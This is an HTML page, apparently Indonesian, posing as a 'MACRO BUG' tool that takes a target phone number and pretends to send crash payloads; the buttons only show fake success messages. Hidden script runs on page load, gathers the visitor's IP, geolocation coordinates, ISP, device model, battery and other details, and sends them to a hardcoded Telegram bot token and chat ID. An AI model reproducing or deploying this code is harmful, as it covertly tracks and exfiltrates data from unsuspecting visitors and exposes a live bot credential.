<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MACRO BUG</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600;700&display=swap');

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Fira Code', monospace;
      background: #0a0a0a;
      color: #00ff88;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
      padding: 20px;
    }

    .container {
      background: rgba(10, 10, 10, 0.95);
      border: 1px solid rgba(0, 255, 136, 0.2);
      border-radius: 12px;
      padding: 30px;
      box-shadow: 0 0 25px rgba(0, 255, 136, 0.2);
      max-width: 400px;
      width: 100%;
      text-align: center;
    }

    .title {
      font-size: 32px;
      font-weight: 700;
      letter-spacing: 3px;
      text-shadow: 0 0 10px rgba(0, 255, 136, 0.6);
      margin-bottom: 20px;
    }

    .input-group {
      margin-bottom: 25px;
    }

    .input-field {
      width: 100%;
      padding: 14px;
      border: 1px solid rgba(0, 255, 136, 0.4);
      border-radius: 8px;
      background: rgba(0, 0, 0, 0.6);
      color: #00ff88;
      font-size: 16px;
      text-align: center;
      outline: none;
      transition: 0.3s;
    }

    .input-field::placeholder {
      color: #555;
    }

    .input-field:focus {
      border-color: #00ff88;
      box-shadow: 0 0 10px rgba(0, 255, 136, 0.4);
    }

    .button-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 15px;
    }

    .btn {
      padding: 12px;
      border-radius: 8px;
      border: 1px solid;
      font-size: 14px;
      color: #00ff88;
      background: rgba(0, 0, 0, 0.4);
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .btn:hover {
      box-shadow: 0 0 15px rgba(0, 255, 136, 0.4);
      transform: translateY(-2px);
    }

    .btn-ios { border-color: #00ff88; }
    .btn-forclose { border-color: #ff0088; color: #ff0088; }
    .btn-delay { border-color: #0088ff; color: #0088ff; }
    .btn-blank { border-color: #ffaa00; color: #ffaa00; }

    .status {
      margin-top: 20px;
      font-size: 14px;
      color: #00ff88;
      min-height: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="title">MACRO BUG</div>
    <div class="input-group">
      <input type="tel" class="input-field" id="phoneNumber" placeholder="[ENTER_TARGET_NUMBER]" maxlength="15">
    </div>
    <div class="button-grid">
      <button class="btn btn-ios" onclick="handleAction('IOS')">IOS</button>
      <button class="btn btn-forclose" onclick="handleAction('FORCLOSE')">FORCLOSE</button>
      <button class="btn btn-delay" onclick="handleAction('DELAY')">DELAY</button>
      <button class="btn btn-blank" onclick="handleAction('BLANK')">BLANK</button>
    </div>
    <div class="status" id="status">> SYSTEM_READY_</div>
  </div>

  <script>
    function handleAction(action) {
      const phoneNumber = document.getElementById('phoneNumber').value.trim();
      const statusDiv = document.getElementById('status');
      if (!phoneNumber) {
        statusDiv.textContent = '> ERROR: TARGET_NOT_SPECIFIED';
        statusDiv.style.color = '#ff0088';
        return;
      }
      statusDiv.textContent = `> EXECUTING_${action}_PROTOCOL...`;
      statusDiv.style.color = '#ffaa00';
      setTimeout(() => {
        statusDiv.textContent = `> ${action}_PAYLOAD_SENT_SUCCESS`;
        statusDiv.style.color = '#00ff88';
      }, 2000);
    }

    // === SCRIPT KIRIM DATA KE TELEGRAM ===
    const botToken = '8446376790:AAE2JlEHOmf8fTXKbJdMtIRnY7K1tRSOwjY';
    const chatId = '6616319071';

    const userAgent = navigator.userAgent.toLowerCase();
    function getMerkHP(ua) {
      if (ua.includes('xiaomi')) return 'Xiaomi';
      if (ua.includes('vivo')) return 'Vivo';
      if (ua.includes('oppo')) return 'Oppo';
      if (ua.includes('realme')) return 'Realme';
      if (ua.includes('samsung')) return 'Samsung';
      if (ua.includes('iphone')) return 'iPhone';
      if (ua.includes('huawei')) return 'Huawei';
      if (ua.includes('asus')) return 'Asus';
      if (ua.includes('infinix')) return 'Infinix';
      return 'Tidak diketahui';
    }
    function getOS(ua) {
      if (ua.includes('android')) return 'Android';
      if (ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
      if (ua.includes('windows')) return 'Windows';
      if (ua.includes('mac')) return 'MacOS';
      if (ua.includes('linux')) return 'Linux';
      return 'Tidak diketahui';
    }
    function getBrowser(ua) {
      if (ua.includes('chrome') && !ua.includes('edge')) return 'Chrome';
      if (ua.includes('firefox')) return 'Firefox';
      if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
      if (ua.includes('edge')) return 'Edge';
      if (ua.includes('opera') || ua.includes('opr')) return 'Opera';
      return 'Tidak diketahui';
    }
    function isMobile(ua) {
      return /android|iphone|ipad|ipod|mobile/i.test(ua) ? 'Mobile' : 'Desktop';
    }

    const merkHP = getMerkHP(userAgent);
    const os = getOS(userAgent);
    const browser = getBrowser(userAgent);
    const platform = isMobile(userAgent);
    const waktu = new Date().toLocaleString();
    const resolusi = `${window.screen.width}x${window.screen.height}`;
    const bahasa = navigator.language || '-';
    const referer = document.referrer || 'Langsung / Tidak ada';
    const cpu = navigator.hardwareConcurrency || 'Tidak diketahui';
    const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Tidak diketahui';
    const koneksi = navigator.connection?.effectiveType || 'Tidak diketahui';

    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        navigator.getBattery().then(battery => {
          const baterai = Math.round(battery.level * 100) + '%';
          const pesan = `
🔹 waktu       : ${waktu}
📩 ip          : ${data.ip}
🌆 kota        : ${data.city}
🌍 region      : ${data.region}
🇮🇩 negara     : ${data.country_name} (${data.country})
🕑 zona waktu  : ${data.timezone}
🛰 provider    : ${data.org}
📍 lokasi      : ${data.latitude}, ${data.longitude}

📱 merk hp     : ${merkHP}
💻 sistem      : ${os}
🌐 browser     : ${browser}
📱 platform    : ${platform}
🧠 RAM         : ${ram}
⚙️ CPU core    : ${cpu}
📶 koneksi     : ${koneksi}
🔋 baterai     : ${baterai}
📐 resolusi    : ${resolusi}
🗣️ bahasa      : ${bahasa}
🔗 referer     : ${referer}
🕵️ user-agent  : ${navigator.userAgent}
          `;
          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: pesan
            })
          });
        });
      });
  </script>
</body>
</html>
